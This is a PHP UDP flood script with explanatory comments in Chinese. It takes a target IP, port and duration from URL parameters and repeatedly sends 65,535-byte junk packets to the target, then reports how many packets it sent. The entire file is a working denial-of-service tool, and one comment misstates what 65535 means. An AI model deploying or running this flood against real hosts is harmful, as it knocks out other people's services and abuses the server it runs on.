<?php  
$packets = 0;  
$ip = $_GET['ip'];  
$rand = $_GET['port'];  
//设置允许脚本运行的时间，单位为秒;如果设置为0（零），没有时间方面的限制。  
set_time_limit(0);  
//设置客户端断开连接时是否中断脚本的执行,当设置为FALSE时表示浏览器断开后脚本不再继续执行。默认为FALSE  
ignore_user_abort(FALSE);  
$exec_time = $_GET['time'];  
//返回当前的 Unix 时间戳   
$time = time();  
print "Flooded: $ip on port $rand <br><br>";  
$max_time = $time+$exec_time;  
//for循环创建一个长度为65535的字符串，内容为“X”,65535一般是内存地址最大值：1×1111111  
for($i=0;$i<65535;$i++){  
        //字符串拼接  
        $out .= "X";  
}  
//无限循环  
while(1){  
$packets++;  
        //直到执行时间到达所设置的时间($exec_time)就终止  
        if(time() > $max_time){  
                break;  
        }  
        //执行fsockopen()函数。打开网络的 Socket 链接，resource fsockopen ( string $hostname [, int $port = -1 [, int &$errno [, string &$errstr [, float $timeout = ini_get("default_socket_timeout") ]]]] )  
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);  
        if($fp){  
                //向打开的链接中写入数据($out-65535个"X")  
                fwrite($fp, $out);  
                fclose($fp);  
        }  
}  
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";  
?>
